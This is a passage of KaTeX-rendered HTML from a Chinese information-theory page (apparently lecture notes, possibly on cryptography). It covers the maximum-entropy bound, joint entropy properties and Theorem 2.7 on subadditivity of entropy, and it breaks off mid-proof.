mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，当且仅当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>=</mo><msub><mi>x</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">x_1=...=x_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>时等号成立<br />由上述不等式可知</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><msub><mi>p</mi><mi>i</mi></msub></mfrac><mo stretchy="false">)</mo><mo>≤</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mo stretchy="false">(</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo>⋅</mo><mfrac><mn>1</mn><msub><mi>p</mi><mi>i</mi></msub></mfrac><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>n</mi></mrow><annotation encoding="application/x-tex">H(X)=\sum_{i=1}^np_i(\log_2\frac{1}{p_i})\le \log_2(\sum_{i=1}^n(p_i\cdot\frac{1}{p_i}))=\log_2n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><p>当且仅当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex">p_i=\frac{1}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时等式成立，证毕。</p><ul><li>联合熵：两个随机变量的熵。性质：</li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>max</mi><mo>⁡</mo><mo stretchy="false">[</mo><mi>H</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>H</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>≤</mo><mi>H</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><msub><mi>X</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>X</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>≤</mo><mi>H</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\max[H(X_1),...,H(X_n)]\le H(X_1X_2...X_n)\le H(X_1)+...+H(X_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">max</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><h3 id="定理27"><a class="markdownIt-Anchor" href="#定理27"></a> 定理2.7</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(XY)\le H(X)+H(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span>，当且仅当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>统计独立时等号成立</p><p>证明：设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>X</mi><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>Y</mi><mo>=</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">]</mo><mo>=</mo><msub><mi>r</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>X</mi><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>=</mo><msub><mi>p</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>Y</mi><mo>=</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">]</mo><mo>=</mo><msub><mi>q</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">Pr[X=x_i,Y=y_j]=r_{ij},Pr[X=x_i]=p_i,Pr[Y=y_j]=q_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" 